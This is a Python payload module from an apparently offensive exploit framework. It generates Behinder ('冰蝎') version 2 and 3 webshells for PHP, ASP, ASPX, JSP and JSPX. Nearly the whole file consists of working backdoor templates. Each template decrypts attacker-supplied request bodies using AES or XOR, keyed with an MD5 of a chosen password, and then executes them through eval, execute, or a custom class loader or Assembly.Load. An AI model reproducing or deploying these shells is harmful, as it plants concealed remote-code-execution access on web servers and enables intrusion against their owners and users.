#!/usr/bin/env python

"""
@Author: Castiel
@Email:  ca3tie1@gmail.com
@Blog:   https://ca3tie1.github.io
@Git:    https://github.com/ca3tie1
@Wechat: Ca5tie1
@Date:   2021/11/30 16:04
"""

import functools
import hashlib

from ExpDepos.libs.core.base.PayloadBase import *


def lang_dispatch(func):
    langs = {}

    @functools.wraps(func)
    def wrapper(self_obj, arg_lang, *args, **kwargs):
        try:
            lang_eval = langs.get(arg_lang)
        except KeyError:
            pass
        else:
            return lang_eval(self_obj, *args, **kwargs)
        return func(self_obj, arg_lang, *args, **kwargs)

    def register(arg_lang):
        def wrap(fun):
            if arg_lang in langs:
                raise ValueError(f'@lang_dispatch 已经注册了 {arg_lang}')
            langs[arg_lang] = fun
            return fun

        return wrap

    wrapper.register = register
    return wrapper


class BehinderWebshell(PayloadBase):
    Name = 'behinder webshell'  # payload名称
    Alias = 'bxwebshell'  # 漏洞别名
    Author = 'Castiel'  # 编写作者
    Category = EXP_CATEGORY.EXPLOITS.WEBAPP
    Create_Date = '2021-11-30'  # payload编写日期
    Update_Date = '2021-11-30'  # payload更新日期
    Desc = """冰蝎2-3常用webshell"""
    Description = """"""

    def _generate(self):
        return self.generateOfLang(self.get_option("lang").lower(),
                                   passwd=self.get_option("pass"),
                                   ver=self.get_option("ver"))

    def _options(self):
        options = dict()
        options["lang"] = OptString("jsp", description="选择脚本语言", require=True,
                                    choices=['php', 'asp', 'aspx', 'jsp', 'jspx'])
        options["pass"] = OptString("cmd", description="连接密码", require=True)
        options["ver"] = OptString("3", description="冰蝎版本 可选2或者3", choices=['2', '3'])
        return options

    @lang_dispatch
    def generateOfLang(self, lang, passwd: str, ver):
        return ''

    @generateOfLang.register('php')
    def php(self, passwd: str, ver):
        if ver == "2":
            return self.php_ver2(passwd)
        return '''
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b";
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
        '''.replace("e45e329feb5d925b", hashlib.md5(passwd.encode("UTF-8")).hexdigest()[:16])

    @staticmethod
    def php_ver2(passwd):
        return '''
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {eval($p."");}}
	@new C($params);
}
?>
        '''.replace("pass", passwd)

    @generateOfLang.register('asp')
    def asp(self, passwd: str, ver):
        if ver == "2":
            return self.asp_ver2(passwd)
        return '''
<%
Response.CharSet = "UTF-8" 
k="e45e329feb5d925b"
Session("k")=k
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
%>
        '''.replace("e45e329feb5d925b", hashlib.md5(passwd.encode("UTF-8")).hexdigest()[:16])

    @staticmethod
    def asp_ver2(passwd):
        return '''
<%
Response.CharSet = "UTF-8" 
If Request.ServerVariables("REQUEST_METHOD")="GET" And Request.QueryString("pass") Then
For a=1 To 8
RANDOMIZE
k=Hex((255-17)*rnd+16)+k
Next
Session("k")=k
response.write(k)
Else
k=Session("k")
size=Request.TotalBytes
content=Request.BinaryRead(size)
For i=1 To size
result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))
Next
execute(result)
End If
%>
        '''.replace("pass", passwd)

    @generateOfLang.register('aspx')
    def aspx(self, passwd: str, ver):
        if ver == "2":
            return self.aspx_ver2(passwd)
        return '''
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
        '''.replace("e45e329feb5d925b", hashlib.md5(passwd.encode("UTF-8")).hexdigest()[:16])

    @staticmethod
    def aspx_ver2(passwd: str):
        return '''
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%if (Request["pass"]!=null){ Session.Add("k", Guid.NewGuid().ToString().Replace("-", "").Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
        '''.replace("pass", passwd)

    @generateOfLang.register('jsp')
    def jsp(self, passwd: str, ver):
        if ver == '2':
            return self.jsp_ver2(passwd)
        return '''
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
        '''.replace("e45e329feb5d925b", hashlib.md5(passwd.encode("UTF-8")).hexdigest()[:16])

    @staticmethod
    def jsp_ver2(passwd: str):
        return '''
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
        '''.replace("pass", passwd)

    @generateOfLang.register('jspx')
    def jspx(self, passwd: str, ver):
        if ver == "2":
            return self.jspx_ver2(passwd)
        return '''
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>
        '''.replace("e45e329feb5d925b", hashlib.md5(passwd.encode("UTF-8")).hexdigest()[:16])

    @staticmethod
    def jspx_ver2(passwd: str):
        return '''
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>if(request.getParameter("pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>
        '''.replace("pass", passwd)
